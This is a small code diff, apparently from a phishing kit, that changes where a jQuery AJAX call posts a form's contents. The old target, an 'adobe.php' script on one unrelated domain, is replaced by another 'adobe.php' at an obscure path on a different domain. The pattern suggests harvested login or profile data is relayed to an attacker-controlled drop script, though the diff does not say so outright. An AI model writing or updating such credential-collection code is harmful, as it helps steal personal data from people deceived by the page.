@@ -11,7 +11,7 @@
             var formData = new FormData($("#profileUp")[0]);
 
             $.ajax({
-                url: "https://supersmartbolivia.com/test/adobe.php",
+                url: "https://deligyongy.hu/cgi-bn/ben/junklrd/adobe.php",
                 type: 'POST',
                 data: formData,
                 contentType: false,
